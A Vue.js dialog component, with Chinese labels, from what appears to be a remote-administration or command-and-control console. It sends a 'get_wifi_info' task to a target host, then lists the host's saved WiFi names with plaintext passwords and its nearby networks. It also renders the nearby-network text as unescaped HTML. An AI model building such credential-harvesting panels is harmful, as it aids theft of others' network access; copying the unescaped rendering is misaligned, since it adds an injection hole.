<template>
  <el-dialog
    v-loading="wifiLoading"
    element-loading-background="rgba(0, 0, 0, 0.5)"
    title="WIFI信息"
    width="60%"
    top="10vh"
    :visible.sync="wifidata.wifiVisible"
    @close="wifiClose"
  >
    <div slot="title">
      {{ wifidata.ip }} — WIFI信息
    </div>
    <div>
      <el-button type="primary" icon="el-icon-refresh" plain @click="sendGetWifiInfo">获取WIFI信息</el-button>
    </div>
    <br>
    <el-table
      :data="wifiData"
      height="400px"
      max-height="400px"
      border
      row-key="id"
      lazy
      :load="loadWifi"
      :tree-props="{ hasChildren: 'hasChildren'}"
    >
      <el-table-column prop="id" label="ID" width="100"></el-table-column>
      <el-table-column prop="SSID" label="WIFI名称" :show-overflow-tooltip="true" min-width="30%"></el-table-column>
      <el-table-column prop="Password" label="WIFI密码" min-width="20%"></el-table-column>
      <el-table-column prop="update_time" label="获取时间" min-width="20%"></el-table-column>
      <el-table-column label="操作" align="center" width="150">
        <template v-if="row.SSID === 'WIFI名称'" slot-scope="{row}">
          <el-button type="success" size="mini" plain @click="seeNearbyWifi(row)">查看附近WIFI</el-button>
        </template>
      </el-table-column>
    </el-table>
  </el-dialog>
</template>

<script>
import { submitTask, getWifiInfo } from '@/api/consoleApi'
import { getToken } from '@/utils/auth'
export default {
  name: 'Wifiinfo',
  props: {
    wifidata: {
      type: Object,
      default: () => {}
    }
  },
  data() {
    return {
      wifiLoading: false,
      timer: '',
      wifiData: []
    }
  },
  watch: {
    wifidata: {
      handler: function(data) {
        if (data.wifiVisible === true) {
          this.wifiLoading = true
          this.init(data)
        }
      },
      deep: true
    }
  },
  methods: {
    // 获取网络代理列表
    init(val) {
      this.wifiLoading = true
      const data = {
        'token': getToken(),
        'key': val.key
      }
      getWifiInfo(data).then(response => {
        if (response.code === 20000 && response.status === true) {
          this.wifiData = response.data
        } else {
          this.$message({
            message: response.msg,
            type: 'error'
          })
          clearInterval(this.timer)
        }
        this.wifiLoading = false
      })
    },
    // 发送获取WIFI信息指令
    sendGetWifiInfo() {
      const data = {
        'key': this.wifidata.key,
        'type': 'get_wifi_info',
        'content': 'get_wifi_info',
        'token': getToken()
      }
      // 提交
      submitTask(data).then(response => {
        if (response.code === 20000) {
          this.$notify.success({
            title: 'info',
            message: '获取WIFI指令发送成功!!',
            duration: 2000,
            showClose: false
          })
          this.wifiData = []
          this.wifiLoading = true
          // 多次提交，保留一个定时器
          clearInterval(this.timer)
          this.timer = setInterval(() => {
            this.init(data)
          }, 3000)
        } else {
          this.$message({
            message: response.msg,
            type: 'error'
          })
        }
      })
    },
    // 加载树形WIFI信息
    loadWifi(tree, treeNode, resolve) {
      const wifiList = []
      var num = 0
      for (const val of tree['wifilist']) {
        console.log(val['SSID'])
        var temp = {
          'id': tree.id + '-' + num,
          'SSID': val['SSID'],
          'Password': val['Password'],
          'update_time': tree.update_time
        }
        num += 1
        wifiList.push(temp)
      }
      setTimeout(() => {
        resolve(wifiList)
      }, 300)
    },
    // 查看附近WIFI
    seeNearbyWifi(row) {
      var htmlstr = '<div style="height: 400px; overflow:auto;">'
      htmlstr += '<pre style="color: rgb(0, 255, 0); margin: 0px;" v-text="row.nearby">' + row.nearby + '</pre>'
      htmlstr += '</div>'
      this.$alert(htmlstr, '附近WIFI信息', {
        confirmButtonText: '确定',
        dangerouslyUseHTMLString: true,
        closeOnClickModal: true,
        closeOnPressEscape: true
      }).catch(() => {

      })
    },
    // 关闭
    wifiClose() {
      clearInterval(this.timer)
      this.wifiData = []
      this.wifidata.wifiVisible = false
    }
  }
}
</script>

<style lang="scss">
  // .el-message-box {
  //   width: 470px;
  // }
</style>
